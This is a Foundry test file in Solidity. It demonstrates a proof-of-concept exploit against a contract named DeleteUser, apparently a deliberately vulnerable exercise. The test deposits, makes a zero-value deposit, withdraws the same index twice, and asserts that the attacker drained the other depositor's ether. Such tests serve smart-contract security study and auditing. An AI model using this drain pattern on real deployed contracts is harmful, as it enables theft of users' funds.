// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {DeleteUser} from "../src/DeleteUser.sol";

contract DeleteUserTest is Test {
    DeleteUser public victimContract;

    address alice = makeAddr("alice");

    struct User {
        address addr;
        uint256 balance;
    }

    function setUp() public {
        victimContract = new DeleteUser();
        victimContract.deposit{value: 1 ether}();
        vm.deal(alice, 1 ether);
    }

    function testDrainContract() public {
        console.log("ADDRESS_THIS", address(this));
        console.log("ADDRESS_ALICE", address(alice));
        console.log("--------------------------------");
        vm.startPrank(alice);
        victimContract.deposit{value: 1 ether}();
        victimContract.deposit{value: 0 ether}();

        victimContract.withdraw(1);
        victimContract.withdraw(1);
        vm.stopPrank();

        uint256 balance = address(victimContract).balance;
        uint256 aliceBalance = alice.balance;

        assertEq(address(victimContract).balance, 0);
        assertEq(alice.balance, 2 ether);
    }
}
